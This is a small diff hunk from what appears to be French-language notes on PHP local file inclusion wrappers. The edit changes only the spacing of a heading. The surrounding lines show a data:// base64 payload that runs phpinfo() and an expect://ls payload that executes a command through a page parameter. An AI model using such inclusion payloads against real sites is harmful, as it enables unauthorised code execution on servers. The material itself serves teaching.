@@ -119,7 +119,7 @@ https://fhbapt.github.io/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/
 La payload est <?php phpinfo(); ?>
 ```
 
-**Wrapper expect://**
+**Wrapper expect:// **
 
 `https://fhbapt.github.io/?page=expect://ls`
 
